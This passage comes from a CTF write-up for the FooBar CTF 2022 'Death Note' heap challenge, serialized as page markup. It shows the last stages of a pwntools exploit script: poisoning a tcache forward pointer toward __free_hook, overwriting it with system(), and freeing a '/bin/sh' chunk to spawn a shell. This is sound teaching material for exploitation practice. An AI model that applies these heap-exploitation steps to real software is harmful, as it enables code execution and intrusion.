comment\",children:\"##########################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"### Stage 3: Overwrite forward pointer ###\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"##########################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'testtest'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"fake_fw_pointer \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xb40\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__free_hook'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),\"                 \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Padding to tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" flat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x111\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"               \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Prev_size and size of tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" flat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fake_fw_pointer\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Overwrite forward pointer\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x130\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"######################################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"### Stage 4: Overwrite `__free_hook` with system() ###\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"######################################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"11\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'/bin/sh'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'system'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"11\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"4-get-flag\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#4-get-flag\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"4. Get flag\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Unfortunately, the time has passed and the server was closed so I cannot connect to it to get the flag but I ran it locally.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/get_flag.png\",alt:\"get_flag.png\"})})]})}}var f=b;return w;})();\n;return Component;","toc":[{"value":"FoobarCTF - Death Note","url":"#foobarctf---death-note","depth":2},{"value":"1. Find bug","url":"#1-find-bug","depth":2},{"value":"2. Brainstorming","url":"#2-brainstorming","depth":2},{"value":"Reference sources","url":"#reference-sources","depth":3},{"value":"Summary:","url":"#summary","depth":3},{"value":"3. Exploit","url":"#3-exploit","depth":2},{"value":"Stage 1: Leak main arena address","url":"#stage-1-leak-main-arena-address","depth":3},{"value":"Stage 2: Leak heap address","url":"#stage-2-leak-heap-address","depth":3},{"value":"Stage 3: Overwrite forward pointer","url":"#stage-3-overwrite-forward-pointer","depth":3},{"value":"Stage 4: Overwrite __free_hook with system()","url":"#stage-4-overwrite-__free_hook-with-system","depth":3},{"value":"4. Get flag","url":"#4-get-flag","depth":2}],"frontMatter":{"readingTime":{"text":"18 min read","minutes":17.69,"time":1061400,"words":3538},"slug":"foobar-ctf-2022/death-note","fileName":"foobar-ctf-2022/death-note.md","title":"FooBar CTF 2022 – Death Note","date":"2022-03-08T00:00:00.000Z","draft":false,"authors":["Johnathan"],"tags":["FooBar CTF 2022","pwn","heap","Shell","Binary Exploit"],"summary":"A classic heap challenge in FooBar.","canonical":"https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/FooBar-CTF-2022/Death-note"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["Johnathan"],"fileName":"Johnathan.md","name":"Johnathan","avatar":"https://www.gravatar.com/avatar/aa9cc3f27f3b1f3c47841d62f18c039f?d=identicon\u0026s=256","specialties":["Pwn"],"github":"https://github.com/nhtri2003gmail","member":true,"retired":true,"description":"A person who does magic things.","order":2,"date":null}],"prev":{"title":"Ugra CTF Quals 2022 – Хохорейсинг","date":"2022-03-04T00:00:00.000Z","draft":false,"authors":["thebish0p"],"tags":["Ugra CTF Quals 2022","Crypto","XOR","Automation","Web Socket"],"summary":"Sometimes you have to google the outputs xD","slug":"ugra-ctf-quals-2022/xorxorracing"},"next":{"title":"UTCTF 2022 – IRC","date":"2022-03-11T00:00:00.000Z","draft":false,"authors":["n0b0dy"],"tags":["UTCTF 2022","forensics","volatility"],"summary":"Analyze memory dump and recover password.","canonical":"","slug":"utctf-2022/irc"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["foobar-ctf-2022","death-note"]},"buildId":"qjVMIloeGVfOBGlHlZkTe","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>